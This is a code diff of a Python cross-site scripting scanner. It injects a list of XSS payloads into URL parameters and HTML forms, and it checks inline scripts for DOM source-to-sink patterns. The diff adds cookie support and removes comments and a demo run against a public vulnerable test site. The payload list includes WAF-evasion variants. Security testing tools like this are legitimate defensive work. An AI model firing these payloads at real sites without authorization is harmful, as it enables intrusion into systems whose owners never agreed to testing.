@@ -1,4 +1,3 @@
-# scanners/xss_scan.py
 import requests
 import urllib3
 import re
@@ -7,23 +6,19 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# 1. Advanced, Mutated Payloads inspired by XSStrike's WAF evasion techniques
 XSS_PAYLOADS = [
     "<script>alert('VULKN_XSS')</script>",
     "\"><script>alert('VULKN_XSS')</script>",
-    # XSStrike WAF Evasion & Context-breaking payloads
     "}]};(confirm)()//\\",
     "<A%0aONMouseOvER%0d=%0d[8].find(confirm)>z",
     "</tiTlE/><a%0donpOintErentER%0d=%0d(prompt)``>z",
     "</SCRiPT/><DETAILs/+/onpoINTERenTEr%0a=%0aa=prompt,a()//"
 ]
 
-# 2. DOM XSS Signatures extracted from XSStrike's test.html logic
 DOM_SOURCES = [r"window\.location", r"URLSearchParams", r"location\.search", r"location\.hash"]
 DOM_SINKS = [r"document\.write", r"document\.writeln", r"innerHTML", r"eval\("]
 
 def get_form_details(form):
-    """Extracts all action, method, and input details from an HTML form."""
     details = {}
     action = form.attrs.get("action", "").lower()
     method = form.attrs.get("method", "get").lower()
@@ -42,7 +37,6 @@ def get_form_details(form):
     return details
 
 def analyze_dom_xss(html_content, target_url):
-    """Scans inline scripts for dangerous DOM sources flowing into sinks."""
     dom_findings = []
     soup = BeautifulSoup(html_content, "lxml")
     scripts = soup.find_all("script")
@@ -50,7 +44,6 @@ def analyze_dom_xss(html_content, target_url):
     for script in scripts:
         if script.string:
             js_code = script.string
-            # Check if the script contains both a source (user input) and a sink (execution)
             for source in DOM_SOURCES:
                 if re.search(source, js_code, re.IGNORECASE):
                     for sink in DOM_SINKS:
@@ -62,12 +55,14 @@ def analyze_dom_xss(html_content, target_url):
                             })
     return dom_findings
 
-def run_xss_scan(target_url: str) -> dict:
+def run_xss_scan(target_url: str, cookies: dict = None) -> dict:
     details = []
     session = requests.Session()
     session.headers["User-Agent"] = "VULKN_Advanced_XSS/2.0"
     
-    # --- PHASE 1: URL PARAMETER INJECTION (Reflected XSS) ---
+    if cookies:
+        session.cookies.update(cookies)
+    
     parsed_url = urlparse(target_url)
     query_params = parse_qs(parsed_url.query)
     
@@ -91,16 +86,13 @@ def run_xss_scan(target_url: str) -> dict:
                 except requests.RequestException:
                     continue
 
-    # --- PHASE 2: HTML FORM INJECTION & DOM ANALYSIS ---
     try:
         response = session.get(target_url, timeout=5, verify=False)
         html_content = response.content
         
-        # Run the XSStrike-inspired DOM static analysis
         dom_results = analyze_dom_xss(html_content, target_url)
         details.extend(dom_results)
         
-        # Parse forms for Reflected XSS
         soup = BeautifulSoup(html_content, "lxml")
         forms = soup.find_all("form")
         
@@ -135,7 +127,6 @@ def run_xss_scan(target_url: str) -> dict:
     except requests.RequestException:
         pass
 
-    # Deduplicate findings
     unique_details = [dict(t) for t in {tuple(d.items()) for d in details}]
 
     return {
@@ -144,12 +135,3 @@ def run_xss_scan(target_url: str) -> dict:
         "vulnerabilities_found": len(unique_details),
         "details": unique_details
     }
-
-if __name__ == "__main__":
-    import json
-    # testphp is perfect for Reflected XSS testing
-    vulnerable_target = "http://testphp.vulnweb.com/search.php?test=query"
-    
-    print("Running Advanced XSS Suite...")
-    result = run_xss_scan(vulnerable_target)
-    print(json.dumps(result, indent=4))
